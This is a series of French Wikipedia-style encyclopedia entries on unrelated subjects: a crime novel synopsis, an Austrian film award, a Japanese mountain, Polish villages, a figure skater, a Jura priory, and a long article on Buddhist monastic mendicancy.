Glenn Thorpe, artiste peintre, a été abattu d'un coup de fusil dans son atelier. Sur son corps, quatre de ses toiles, représentant fidèlement chacune une femme différente, nue. La première a accueilli Al Wheeler sur les lieux du crime, où un tireur nocturne brise les phares de l'Austin-Healey fétiche du lieutenant. Reste à identifier les trois autres modèles pour remonter à l'assassin : un mari jaloux de l'artiste séducteur ? ou une femme lasse du chantage qu'il avait mis en place ? Blondes, rousse, brune, aucune n'a d'alibi, pas plus que leurs maris, ce qui fait beaucoup de suspects. Tous semblent vouloir coopérer à l'enquête, bien sûr ; mais dans quel but ? 

</doc>
<doc id="8978139" url="https://fr.wikipedia.org/wiki?curid=8978139" title="Marat (téléfilm)">
Marat (téléfilm)



</doc>
<doc id="8978143" url="https://fr.wikipedia.org/wiki?curid=8978143" title="Romy">
Romy

Le Romy est une récompense du cinéma et de la télévision autrichienne qui est décernée chaque année par le quotidien "Kurier" à la mémoire de l'actrice Romy Schneider. La remise des prix a lieu chaque année au palais de Hofburg, à Vienne.
Lancé à l'origine en 1990 comme un prix de télévision pur, les services dans le domaine du cinéma sont pris en compte depuis 2010.
Rudolf John est l'initiateur et le concepteur de ce prix. 
Statuette.
La statuette plaquée or 24 carats est haute de 30,5 cm, pèse environ 2,9 kilogrammes. Sa forme rappelle une scène du film "La Piscine"" "avec Alain Delon dans laquelle Romy Schneider arrange sa robe.

</doc>
<doc id="8978152" url="https://fr.wikipedia.org/wiki?curid=8978152" title="Mont Iizuna">
Mont Iizuna

Le , aussi connu sous le nom , est une montagne culminant d'altitude à au nord-nord-ouest du centre de la ville de Nagano dans la préfecture du même nom au Japon. Avec le , le et d'autres, elle forme la chaîne des monts Iizuna.
Cette montagne est un lieu sacré pour les sectes religieuses basées sur la montagne comme le shugendo et passe pour abriter un "tengu" appelé Saburō. Selon la légende, il y avait autrefois un étrange sable comestible quelque part dans la montagne que le "tengu" distribuait en période de mauvaise récolte.
Cette montagne est également un endroit populaire pour pratiquer le ski. C'est ici que se sont déroulées les compétitions de bobsleigh et de luge des Jeux olympiques d'hiver de 1998.

</doc>
<doc id="8978154" url="https://fr.wikipedia.org/wiki?curid=8978154" title="Cellules de Merkel">
Cellules de Merkel



</doc>
<doc id="8978155" url="https://fr.wikipedia.org/wiki?curid=8978155" title="Pontiac Tempest">
Pontiac Tempest

La Pontiac Tempest est une automobile produite par le constructeur Pontiac de 1961 à 1991.

</doc>
<doc id="8978158" url="https://fr.wikipedia.org/wiki?curid=8978158" title="Feritcan Şamlı">
Feritcan Şamlı

Feritcan "Ferit" Şamlı, né le à Istanbul, est un coureur cycliste turc. Il évolue au sein de l'équipe Spor Toto. 
Biographie.
Feritcan Şamlı naît le en Turquie.
Membre de Brisaspor en 2013, il entre dans l'équipe Torku Şekerspor en 2014, année où il devient champion de Turquie sur route.

</doc>
<doc id="8978161" url="https://fr.wikipedia.org/wiki?curid=8978161" title="Anne Sophie de Danemark">
Anne Sophie de Danemark



</doc>
<doc id="8978184" url="https://fr.wikipedia.org/wiki?curid=8978184" title="Artolie">
Artolie

L'Artolie est un ruisseau français, affluent de la Garonne, qui coule dans la région naturelle de l'Entre-deux-Mers situé dans le département de la Gironde en région Aquitaine.
Géographie.
L'Artolie prend sa source en Gironde, sur la commune de Capian, au sud-est du bourg, au lieu-dit Brisson. Son cours, d'une longueur de , prend d'abord la direction de l'ouest, puis s'infléchit vers le sud en longeant la commune de Langoiran. Au bas du coteau il traverse Paillet où il conflue avec le bras de la Garonne enserrant l'île de Raymond.
Il donne son nom à la communauté de communes du Vallon de l'Artolie.
Hydrologie.
Affluents de l'Artolie.
Le Service d'administration nationale des données et référentiels sur l'eau (SANDRE) et le Système d'Information sur l'Eau du Bassin Adour Garonne (SIEAG) ont répertorié 4 affluents et sous-affluents de l'Artolie.
Dans le tableau ci-dessous se trouve : le nom de l'affluent ou sous-affluent, la longueur du cours d'eau, son code SANDRE, des liens vers les fiches SANDRE, SIEAG et vers une carte dynamique de OpenStreetMap qui trace le cours d'eau.
Le la commune de Paillet est dévastée par la crue de l'Artolie et le débordement du bassin de rétention situé au-dessus du village provoquant des glissements de terrain et des coulées de boue à la suite des violents orages qui ont éclaté sur l'Entre-deux-Mers. Les équipements communaux sont rendus impraticables, plusieurs dizaines de maisons sont détruites et plusieurs foyers sont évacués, conduisant la préfecture à reconnaître la commune en état de catastrophe naturelle. L'absence de prise en compte des esteys dans les plans de prévention du risque inondation, l'insuffisance du bassin de rétention, l'urbanisation des coteaux, l'arasement des terrains boisés ou la modification de l'orientation des pieds de vignes pour un meilleur rendement sont évoqués parmi les raisons expliquant les difficultés à endiguer la crue du ruisseau devenu torrent.

</doc>
<doc id="8978185" url="https://fr.wikipedia.org/wiki?curid=8978185" title="Farbenspiel">
Farbenspiel

Farbenspiel est le sixième album studio d'Helene Fischer. L'album est sorti le 4 octobre 2013 et atteint dès la première semaine la première place dans les charts en Allemagne. Il se tient en tête des charts plusieurs semaines durant trois années consécutives : 2013 (3 semaines), 2014 (11 semaines) et 2015 (1 semaine). Il est également en tête du classement des albums en Autriche et en Suisse. Il atteint la en Belgique et la au Danemark. À la fin de l'année 2013, l'album est classée mondial. Fin 2015, l'album est certifié en Allemagne 11 fois disque de platine et fait ainsi partie des albums les plus vendus dans ce pays depuis 1975.
L'album est certifié en Allemagne 13 fois platine en janvier 2023 pour ventes. Il contient le gros succès "" (38 semaines dans le top 10), certifié diamant en 2015, ainsi que d'autres hits mineurs : "Mit keinem andern", "Unser Tag" et "Fehlerfrei" (titres certifiés or en 2023). 

</doc>
<doc id="8978190" url="https://fr.wikipedia.org/wiki?curid=8978190" title="Eublepharis satpuraensis">
Eublepharis satpuraensis

Eublepharis satpuraensis est une espèce de geckos de la famille des Eublepharidae.
Répartition.
Cette espèce est endémique du Madhya Pradesh en Inde. Elle se rencontre dans les Satpura Hills.
Description.
"Eublepharis satpuraensis" mesure de à sans la queue.
Étymologie.
Son nom d'espèce, composé de "satpura" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, les Satpura Hills.

</doc>
<doc id="8978198" url="https://fr.wikipedia.org/wiki?curid=8978198" title="Jarosławice (Mazovie)">
Jarosławice (Mazovie)

Jarosławice (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Wolanów (siège de la "gmina"), à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978201" url="https://fr.wikipedia.org/wiki?curid=8978201" title="Jarosławice">
Jarosławice

En Pologne, Jarosławice peut désigner :

</doc>
<doc id="8978202" url="https://fr.wikipedia.org/wiki?curid=8978202" title="Satoko Miyahara">
Satoko Miyahara

, née le à Kyoto, est une patineuse artistique japonaise à la retraite.
Elle est médaillée d'argent des Championnats du Monde de 2015 et médaillée de bronze des Championnats du Monde de 2018. Elle est la championne de la compétition Quatre Continents 2016, médaillée d’argent en 2014 et 2015, et médaillé de bronze en 2018 lors du même événement. Elle est deux fois médaillée d’argent de la Finale du Grand Prix en 2015 et 2016, et quatre fois championne nationale de 2014 à 2017. Elle est aussi neuf fois médaillée du circuit du Grand Prix entre 2014 et 2018.
Biographie.
Jeunesse.
Satoko Miyahara naît le dans l'arrondissement de Nakagyō-ku à Kyoto, de deux parents médecins.
Carrière sportive.
Niveau novice et junior.
Satoko Miyahara commence à patiner en 2002 au Kansai University Skating Club.
Saison 2011/2012.
Durant la saison 2011/2012 , Miyahara est devenu admissible aux compétitions internationales junior de l'ISU. Elle a remporté une médaille d'argent lors de son premier Grand Prix à Gdansk, en Pologne, et a terminé à sa deuxième compétition à Milan, en Italie. Miyahara a ensuite remporté le titre national junior et s'est classée aux Championnats nationaux niveau senior. Elle a terminé à ses premiers Championnats du monde junior à derrière la médaillée de bronze Adelina Sotnikova.
Saison 2012/2013.
Miyahara a remporté l'or et le bronze à ses deux événements du Junior Grand Prix aux États-Unis et en Turquie. Miyahara a ensuite remporté les Championnats nationaux catégorie junior en 2012, avant de s'être classée lors de la Finale du Junior Grand Prix à Sotchi, en Russie. Miyahara a remporté sa première médaille nationale au niveau senior, la médaille de bronze, aux Championnats du Japon également en 2012, devançant Akiko Suzuki. Elle a terminé sa saison avec les Championnats du monde junior en 2013 à la .
Niveau senior.
Saison 2013/2014.
Miyahara a fait ses débuts sur le circuit senior. Elle a commencé sa saison en remportant le Trophée d'Asie, devançant Zhang Kexin.
Miyahara s'est ensuite classée au Trophée NHK avec un score total de , après avoir été dans le programme court avec un score de 58.39 points et dans le programme libre avec un score de . Elle a également été en lors de la Coupe de Russie avec un score total de , après avoir été dans le programme court avec un score de et dans le programme libre avec un score de .
Aux Championnats du Japon en 2013, Miyahara a terminé , avec un score total de , derrière Akiko Suzuki (or), Kanako Murakami (argent) et Mao Asada (bronze). Elle a été dans le programme court avec un score de et dans le programme libre avec un score de .
Miyahara a été sélectionné pour participer aux Championnats des quatre continents en 2014 où elle a remporté la médaille d'argent, derrière sa coéquipière, Kanako Murakami, avec un score total de . Elle s'est classée dans le programme court avec un score de et dans le programme libre avec un score de .
Miyahara a ensuite participé aux Championnats du monde junior 2014 où elle a terminé avec un score total de , à moins d'un point derrière la médaillée de bronze, Ievguenia Medvedeva.
Saison 2014/2015.
Miyahara est allé à un camp d'entraînement pendant l'été pour travailler sur ses sauts avec le champion olympique 1998, Ilia Kulik.
Miyahara a commencé sa saison en remportant le trophée Lombardia.
Elle a ensuite remporté le bronze au Skate Canada avec un total de , après avoir été dans le programme court et dans le programme libre. Miyahara a remporté une autre médaille de bronze au Trophée NHK avec un score total de , après avoir été dans le programme court et dans le programme libre. Avec ces résultats, Miyahara était la pour la Finale du Grand Prix avec Rika Hongo (finalement appelée à remplacer Gracie Gold).
Aux Championnats du Japon, Miyahara s'est placé dans le programme court avec un score de , mais a remporté le programme libre avec un score de , ce qui était suffisant pour gagner son premier titre national avec un score total de .
Miyahara a ensuite participé aux Championnats des quatre continents 2015 où elle a remporté l'argent pour la deuxième année consécutive après avoir remporté le programme court avec un score de et en se plaçant en dans le programme libre avec un score de . Elle a obtenu à l'issue de ces championnats un score total de .
Lors des Championnats du monde 2015, Miyahara a obtenu des records personnels dans les deux programmes, après avoir été dans le programme court avec un score de , dans le programme libre avec un score de . Elle a gagné la médaille d'argent avec un score total de .
Saison 2015/2016.
Elle a remporté un deuxième titre consécutif aux Championnats du Japon.
Saison 2016/2017.
En , elle souffre d'une fracture à l'os coxal.
Saison 2018/2019.
Elle remporte, la médaille d'argent aux championnats du monde de 2018.
Saison 2019/2020.
En , elle finit deuxième à la Coupe de Chine.

</doc>
<doc id="8978204" url="https://fr.wikipedia.org/wiki?curid=8978204" title="Kacprowice">
Kacprowice

Kacprowice (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978205" url="https://fr.wikipedia.org/wiki?curid=8978205" title="Prieuré de Saint-Lothain">
Prieuré de Saint-Lothain

Le château de Baume, dit prieuré de Saint-Lothain, est un ancien prieuré bénédictin en ruine, fondé au , par l'abbé Lautein (v. 448-518) à Saint-Lothain, près de Poligny, dans le Jura en Franche-Comté.
Historique.
Lautein nait à Autun vers 448, et devient moine de l'abbaye Saint-Symphorien d'Autun, à l'époque dans le royaume des Burgondes, avec pour maître spirituel, l'abbé Laurent.
Il obtient la permission de ses supérieurs de partir vivre en ermite dans le village de Saint-Lothain (village d'origine celte Séquanes, alors baptisé "Silèze" ou "Salèce", à de Poligny et de Lons-le-Saunier, en Sapaudie (du royaume des Burgondes). Le village a été détruit par les invasions barbares des Huns et peuples germaniques sur la Gaule romaine/Empire romain entre le et le ...
Il s'installe et vie dans la vertu, l’austérité et la pénitence, dans les bois du sommet du village, à l'emplacement d'un ancien temple et cimetière païen (expansion du christianisme du Ve siècle au XVe siècle). Il est rapidement rejoint par de nombreux adeptes et fonde ce prieuré en 480, sur l'emplacement de l'actuelle église de Saint-Lothain, sous le vocable de Saint-Martin, avec jusqu’à soixante dix moines d'effectif.
Devenus trop nombreux à Silèze, il fonde rapidement un second prieuré dédié à saint Symphorien d'Autun, dans le village de "Maximiacus" (ou "Maximiac", actuel Buvilly, ou au lieu-dit "le Carillot", à au nord-ouest), pour y établir une communauté de 40 moines supplémentaires.
Vers 888, les deux monastères sont ruinés par les invasions vikings en France. Le prieuré de Saint-Lothain (à défaut de celui de Buvilly) est rétabli par saint Bernon, abbé de l'abbaye Saint-Pierre de Baume-les-Messieurs (à au sud), fondateur de nombreuses abbayes dont l'abbaye Saint-Pierre de Gigny en 890, et l'abbaye de Cluny vers 910. Le monastère adopte alors la règle bénédictine, et dépend de l'abbaye de Baume-les-Messieurs, puis de l'abbaye de Cluny et de l'ordre de Cluny, elle-même directement dépendante des papes du Vatican.
En 1791, pendant la Révolution française, la maison prieurale et le domaine sont vendus comme bien national. Quelques bâtiments privés en mauvais état de restauration subsistent ainsi que quelque traces d'autres anciens bâtiments d'époque. Il ne reste aucune trace connue du prieuré de Buvilly. D'importantes caves à vin voûtées subsistantes sous le prieuré, démontrent que les moines ont exploité historiquement le vignoble du Jura.
L'actuelle crypte de l'église (où sont conservés l'autel, le sarcophage mérovingiens et les reliques de Lautein) et la maison prieurale (reconvertie en logements privés) datent du . L'actuelle église de Saint-Lothain de style roman date du .

</doc>
<doc id="8978207" url="https://fr.wikipedia.org/wiki?curid=8978207" title="Kolonia Wolanów">
Kolonia Wolanów

Kolonia Wolanów (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de en 2006.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978208" url="https://fr.wikipedia.org/wiki?curid=8978208" title="Kowala-Duszocina">
Kowala-Duszocina

Kowala-Duszocina (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978209" url="https://fr.wikipedia.org/wiki?curid=8978209" title="Satako Miyahara">
Satako Miyahara



</doc>
<doc id="8978210" url="https://fr.wikipedia.org/wiki?curid=8978210" title="Sophie Kennedy Clark">
Sophie Kennedy Clark

 
Sophie Kennedy Clark est une actrice écossaise née en 1990.
Jeunesse.
Sophie Kennedy Clark est née à Aberdeen en Écosse en 1990. Elle est la fille de Fiona Kennedy. Elle sait jouer de la harpe. Elle a un frère de 21 ans, Francis, et une sœur de 22 ans, Hannah. Après avoir été diplômé de la New York Film Academy, Sophie passe des auditions et joue dans plusieurs films indépendants.
Carrière.
Sa première grande percée est venue quand elle a joué le rôle de la fille aînée de David Tennant dans la série télévisée . Elle fait ensuite du théâtre au Southwark Playhouse à Londres et est apparu dans plusieurs projets, y compris dans le rôle de Lauren dans l'épisode de " Black Mirror" : 'L'hymne national'. En 2012, elle a fait une courte apparition dans " Dark Shadows", avec Johnny Depp. En 2014, elle est apparue dans le film de Lars von Trier "Nymphomaniac" et dans le film de Stephen Frears, "Philomena".

</doc>
<doc id="8978211" url="https://fr.wikipedia.org/wiki?curid=8978211" title="Kowalanka">
Kowalanka

Kowalanka (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978213" url="https://fr.wikipedia.org/wiki?curid=8978213" title="Młodocin Większy">
Młodocin Większy

Młodocin Większy (prononciation : ) est un village polonais de la gmina de Wolanów dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8978214" url="https://fr.wikipedia.org/wiki?curid=8978214" title="Bouddhisme et mendicité">
Bouddhisme et mendicité

La mendicité, dans le bouddhisme, (sanskrit et pāli: piṇḍapāta, «aumône de nourriture » ou selon une autre étymologie « bol à aumônes » ou encore, par extension, « tournée d'aumône ») est un aspect essentiel de la pratique du monachisme bouddhique. Le bouddhisme est l'une des traditions religieuses qui possède une pratique bien établie de la mendicité. La nécessité de mendier est liée à la recherche de détachement, qui est au cœur de cette pratique. Ce détachement se marque par l’interdiction, pour les moines et les nonnes, de posséder quoi que ce soit ou presque. La mendicité est aussi une importante occasion de contacts entre la communauté monastique ("sangha") et les laïcs, dont la générosité permet d’acquérir des mérites ("punya") pour leurs vies futures.
La mendicité est imposée et largement codifiée par les règles monastiques (Vinaya) qui expliquent pourquoi et comment elle doit se faire. Mais sa pratique a évolué, tant dans le temps que dans l’espace. Progressivement, les moines et nonnes se sont rassemblés autour de monastères qui ont commencé à acquérir des terres et des propriétés, si bien que la mendicité n’était plus nécessaire. Cela a été particulièrement marqué dans la tradition mahāyāna en Asie de l’Est. En Asie du Sud-Est, dans la tradition du theravāda, la pratique de la mendicité se maintient, même si elle a tout de même reculé.
Mendicité dans le bouddhisme.
La pauvreté est un trait essentiel de la vie monastique dans le bouddhisme. Le moine et la nonne bouddhistes sont respectivement un "bhiksu" et une "bhiksuni", termes sanskrits signifiant littéralement « [une personne] qui vit d’aumônes », ou encore les « religieux errants » ou « religieux mendiant ». L’idéal originel du bhiksu consiste à vivre dans la simplicité, presque sans possessions, sans travail rémunéré et en étant donc nourri par les dons des laïcs. Si le bhiksu est d’abord un renonçant, c’est parce qu’il cherche la délivrance et délaisse donc tout ce qui peut l’encombrer. 
Mais il faut aussi voir que moines et nonnes ne sont pas des solitaires. Ils vivent au sein du sangha, qui doit donc organiser sa survie économique. En Inde, où le bouddhisme est né, on a toujours accepté la mendicité comme moyen de vivre. Mendier n’était aucunement synonyme d’inutilité sociale. Moines et nonnes ne se voyaient pas comme des désœuvrés : au contraire, ils menaient une vie active, en méditant et en limitant leurs désirs. Loin de considérer ces mendiants contemplatifs comme des parasites, le bouddhisme voit en eux la justification de la société.
Pratique de la mendicité.
Le Vinaya exige des moines et nonnes qu’ils réduisent leur attachement à la richesse et aux biens matériels, car ils sont le principal obstacle à l’éveil. En outre, mendier favorise l’humilité et aide ainsi à réduire l’attachement au faux soi (l"'ahaṃkāra" ou le "jīvātman" de l’hindouisme). En plus, elle favorise les contacts entre communauté religieuse et laïcs, qui sont le principal soutien du sangha, et fournit à ces derniers l’occasion d’acquérir des mérites ("punya"). Enfin, tandis que les laïcs permettent aux membres du sangha de rester en bonne condition physique, ceux-ci offrent aux laïcs des bienfaits spirituels.
Moines et nonnes ne peuvent posséder que très peu de choses. Le Bouddha a précisé que quatre choses sont nécessaires pour vivre. Quatre éléments fondamentaux ("Nishraya") leur sont donc autorisés : la nourriture obtenue en mendiant, un vêtement ("chivara"), un lieu pour passer la nuit (le pied d’un arbre) et de l’urine de vache fermentée à titre de médicament (B 593). À cela viennent s’ajouter une série de huit choses indispensables (mais on trouve aussi des séries de treize, dix-huit et plus encore) : parmi eux, on relèvera un bol ("patra") — dans la série des huit — et un bâton ("khakkhara") – dans la série des dix-huit.
Les besoins d'un bhiksu et la manière de les satisfaire sont largement traités dans la règle de grands codes monastiques ("Vinaya") (A95). Ceux-ci interdisent expressément aux communautés monastiques de posséder des terres (et aussi de les cultiver), de faire des réserves ou encore d’avoir de l’argent. Ils prescrivent au moine qu’il subvienne à ses besoins par la mendicité. Le Vinaya définit même la mendicité comme « la bonne manière de vivre » pour les moines et les nonnes. Dès lors, « tendre le bol » (traduction littérale de "pindapâta", le terme sanskrit que l’on traduit par "mendicité", est une activité incontournable. Et comme le moine et la nonne sont aussi décrits comme ceux qui mènent une « vie sans maison », ils se voient obligés de demander l’aumône non seulement pour la nourriture, mais pour tout ce dont ils ont besoin.
Les aumônes des laïcs consistent essentiellement en nourriture, mais elles peuvent aussi se présenter sous forme de vêtements, de médicaments et d’autres produits de première nécessité.
Rituel.
C’est des Vinaya que viennent les principales règles de la mendicité, présentées ci-dessous (qui peuvent varier quelque peu d'un Vinaya à l'autre).
La nourriture est distribuée chaque matin par les laïcs aux moines et aux nonnes lors de leur tournée pour recevoir des aumônes. En général, les moines se rendent en file dans les villes ou villages, le matin. Ils se déplacent avec calme et dignité, silencieux et recueillis, gardant les yeux baissés. Ils mendient en principe de maison en maison. Des femmes, le plus souvent, et quelques hommes sortent et vont à leur rencontre pour déposer dans leur bol la nourriture. Selon le Vinaya pâli, cette nourriture peut se présenter sous cinq formes : riz cuit, farine grillée ou cuite, riz et légumineuses, poisson, viande. Il est interdit de choisir ou de demander quelque chose de particulier. D’autre part, l’aumône se reçoit sans regarder les donateurs ni les remercier puisque, on le verra, donner est une façon pour les laïcs d’acquérir des mérites ("punya"). Cette nourriture doit être reçue et consommée entre l’aube et le zénith, ce qui veut dire que le moine doit être de retour avant la fin de la matinée, afin de pouvoir manger ce qu’il a reçu, et cela sans trier la nourriture: ainsi currys et desserts se mélangent souvent dans le même bol. 
Bol et bâton.
En pratique, moines et nonnes se munissent d’un bol à aumônes ("patra") et d’un bâton ("khakkhara"). Celui-ci est en général en bois ou en fer et sert à écarter les bêtes sauvages et autres animaux. De plus, il est surmonté d’une coiffe en cuivre, de part et d'autre de laquelle pendent des anneaux de métal qui se présentent souvent par série de quatre, six ou douze, et qui tintent quand on agite le bâton (le nom sanskrit du bâton est d’ailleurs une onomatopée rappelant ce tintement). Le bâton sert ainsi également à prévenir de l’arrivée de moines en tournée d’aumône. La coiffe peut aussi être ornée de symboles des enseignements et des vertus du Bouddha. Au Japon, le bodhisattva Kshitigarbha (jp. Jizō) est souvent représenté avec un tel bâton.
Quant au bol, il peut être de taille petite, moyenne ou grande. Selon le Vinaya, il peut être en en fer ou en argile ; les matériaux comme l’or, l’argent, le bronze, le verre et le bois sont interdits. Toutefois, dans le zen, aujourd’hui, on utilise le plus souvent des bols en laque noire ou rouge, ce qui est en principe interdit par le Vinaya.
Bol du Bouddha....
Si le bol à aumônes est un symbole important dans toutes les traditions bouddhiques, c'est qu'il était le signe de la souveraineté du Bouddha. D’ailleurs, outre les reliques corporelles, les objets matériels utilisés par le Bouddha, dont son bol à aumônes, ont été vénérés comme des reliques et déposés dans des stûpas. 
L'histoire canonique du bol du Bouddha est rapportée au chapitre 24 du sûtra "Lalitâvstara", consacré à l'histoire des frères Trapusa et Bhallika. Ces deux hommes arrivèrent devant le Bouddha à la fin de la septième semaine de jeûne qui suivit son éveil et lui offrirent son premier repas. Alors qu’on pourrait s’attendre que ce soient des dieux qui lui apportent sa première nourriture à ce moment, l'honneur échoit aux deux frères, simples marchands, de surcroît juste de passage dans la région. Toutefois, le Bouddha n'avait alors plus de bol, et il jugeait inconvenant de prendre la nourriture directement dans ses mains. La chose est importante, car le Bouddha est désormais ordonné moine bouddhiste parce qu'il a connu l’illumination. Dès lors, il ne peut recevoir que de la nourriture déposée par un donateur dans un bol à aumône. 
À ce moment arrivent les quatre dieux gardiens des quatre directions "(Lolkapala)" pour lui fournir un bol. C'est ce bol qui devra désormais servir au Bouddha dans ses tournées de mendicité, et on peut s'attendre qu’après la mort de ce dernier, il deviendra donc une relique vénérée. Les dieux lui offrent des bols en or, que le Bouddha refuse car l'or ne convient pas à un moine mendiant. Ils lui proposent alors successivement six autres matières (argent, jade, saphir, etc.) qu'il rejette à chaque fois. Finalement, ils apportent un bol de pierre, suivant en cela la règle monastique, et le Bouddha l'agrée. Mais il juge inutile d’avoir quatre bols. De crainte toutefois de peiner les trois autres dieux s'il n'accepte qu'un bol, il transforme les quatre récipients en un seul, qui garde cependant à son sommet la trace du rebord des trois autres. 
Ce bol deviendra donc une relique conservée dans un grand monastère de Peshawar où il était montré aux fidèles deux fois par jour (vraisemblablement sur un trône abrité par un dais), et où le célèbre pèlerin chinois Faxian le vit lorsqu’il passa par cette ville au début du ; il affirma même que l'on y remarquait les rebords des trois autres bols. On lui rapporta en outre que lorsque le roi Yuezhi qui envahit cette région voulut emporter le bol, huit éléphants ne parvinrent pas à déplacer la précieuse relique. Deux siècles plus tard toutefois, le moine Xuanzang, autre grand pèlerin chinois, trouvera le « monastère du bol » en ruines et le vase disparu.
Selon l'indianiste Alfred Foucher, cette histoire vise à montrer les premiers hommes qui firent au Bouddha la première aumône de nourriture et qui devinrent ainsi le modèle des fidèles laïques. Mais l’histoire n’est pas terminée : en échange de cette offrande, le Bouddha leur fait don de son enseignement sur l’éveil. Il leur donne en outre des bouts de ses cheveux et de ses ongles, pour lesquels les frères érigèrent deux stupas. Le bouddhologue John Strong relève que cet épisode est donc à la source de plusieurs « premières » dans l'histoire du bouddhisme, puisque l'on y trouve 
...et bol des maîtres.
Plus tard, on rencontre un phénomène identique avec anciens maîtres dont les bols sont aussi parfois devenus des reliques. Enfin, dans certaines traditions, et tout particulièrement dans le chan et le zen, le maître remet son bol (avec son "kesa") au disciple, signes de transmission de la lignée, et plus fondamentalement de la transmission de la Voie du Bouddha. 
Les images dans la galerie ci-dessous montrent également que, à côté des bols employés au quotidien, on en trouve qui pouvaient aussi être de véritables objets d'art destinés à des cérémonies pour des divinités, ce qui fait écho à la remarque de Foucher, ci-dessus, sur la présentation du bol du Bouddha à Peshawar.
Mendicité et rapports entre moines et laïcs.
Le don ("dâna") est la première vertu bouddhiste ("paramita") et elle est un facteur essentiel du progrès spirituel et moral. Cette générosité du don s’exerce en premier lieu envers le Sangha, et elle est étroitement liée à un autre concept très important : celui de mérite ("punya"). Les mérites s’acquièrent par des actions vertueuses qui porteront leurs fruits sous forme de bonheur dans une vie ultérieure. Par ailleurs, les mérites acquis peuvent s’accumuler au cours de nombreuses vies, permettant des renaissances heureuses et l’atteinte de la bouddhéité. Or le don est le premier moyen (à côté de la moralité ("sîla") et de la méditation ("bhâvana")) d’accumuler ces mérites, tout particulièrement en se montrant généreux et charitable envers le sangha, et cela en fait une pratique centrale bouddhisme.
Il y a donc une réciprocité qui s’installe entre donataires et donateurs. Les premiers ont besoin pour vivre du don et des offrandes qu’ils reçoivent en pratiquant la mendicité. Les seconds ont besoin du sangha pour acquérir des mérites. Mais ce don ne va pas sans contre-don : le sangha offre en effet aux laïcs quelque chose de bien plus élevé : le don du Dharma qui, selon le Bouddha, « surpasse tous les dons ». Ainsi, on peut aussi considérer que faire l'aumône est une manière, pour les donateurs, de remercier les religieux de consacrer leur vie à pratiquer et enseigner le dharma.
Cette réciprocité est un aspect essentiel de la relation entre le sangha et la communauté des laïcs, car les uns et les autres y trouvent une des principales occasions de contact et d’interaction. Le sangha devient « un champ de mérites » très fertile sur lequel les dons semés poussent avec vigueur. C’est là une des principales occasions de contact et d’interaction entre moines et laïcs.
En ce sens, une des peines les plus sévères que les moines puissent infliger à des laïcs consiste à refuser leurs offrandes, un geste appelé "patranikubjana", c’est-à-dire « retourner son bol » (au lieu de le tendre vers les donateurs). Cela peut se produire si un laïc s’en prend à des moines ou des nonnes, les malmène un moine ou les critique. Si les laïcs font amende honorable, le sangha met un terme à cette mise à l’écart, en « remettant le bol à l’endroit ».
Évolution de la pratique de la mendicité en bouddhisme.
La pratique de la mendicité a passablement évolué, à la fois dans le temps et dans l’espace.
Inde et Asie du Sud-Est : le théravada.
La mendicité est une pratique fondamentale du bouddhisme monastique qui trouve son origine dans l'Inde ancienne : Siddhartha Gautama lui-même mendiait, mais il n’était pas le seul à le faire. Des groupes issus de différents courants religieux, parmi lesquels ceux qui se rattachaient au Bouddha, trouvaient leur subsistance en mendiant auprès des laïcs. C’est le cas en particulier des shramaṇes hindous ou jaïns ainsi que des sannyasin. 
Elle est devenue une pratique de base du bouddhisme : les premières règles monastiques exigent des moines et des nonnes qu’ils vivent dans la forêt, sans autre abri que la cime d’un arbre. Pour le Vinaya, résider dans un lieu abrité (maison, temple, monastère, maison) est un luxe dangereux. D’autre part, il était interdit de creuser et travailler la terre ainsi que de posséder or ou argent : il s’agissait d’empêcher les moines de devenir auto-suffisants et de se couper ainsi des laïcs. Cette règle concernant l’argent était si claire que la proposition de la contourner, émise lors du deuxième concile de Vaisali, une centaine d’années après la mort du Bouddha, entraîna une scission importante dans la communauté. Ce sont là toutes choses qui rendaient la mendicité indispensable.
Aujourd'hui, même si les communautés bouddhistes continuent à dépendre des dons des laïcs, on peut cependant dire que la mendicité reste une activité monastique seulement dans quelques parties du monde bouddhiste. C'est surtout en Asie du Sud-Est, dans les pays où le bouddhisme théravada s'est développé, que cet usage s'est maintenu jusqu'à nos jours: Cambodge, Laos, Myanmar (Birmanie), Thaïlande, Viêt Nam, ainsi qu'au Sri Lanka. Cela s'explique en partie par le fait que les monastères y sont souvent de taille réduite, si bien que la mendicité reste indispensable à la vie du sangha.
Asie de l’Est : le mahâyâna.
Toutefois, avec l'expansion de la communauté monastique, les règles s’assouplirent peu à peu et la vie monastique se développa. Cela survint tôt dans l'histoire du bouddhisme, entre autres raisons parce qu'il était difficile, voire impossible, pour de grands groupes de moines de trouver de la nourriture en suffisance en mendiant. D'autre part, les donations de terres augmentèrent, temples et monastères se transformèrent en propriétaires terriens, mettant en place des systèmes de fermage conséquents. Et de fait, en Asie de l’Est — où domine le bouddhisme du courant mahâyâna — la mendicité n’est pas pratiquée partout comme un élément de base de la vie monastique régulière. Et quand on la trouve, ce n'est pas en suivant les règles traditionnelles du Vinaya de tournée quotidienne pour quêter des aumônes.
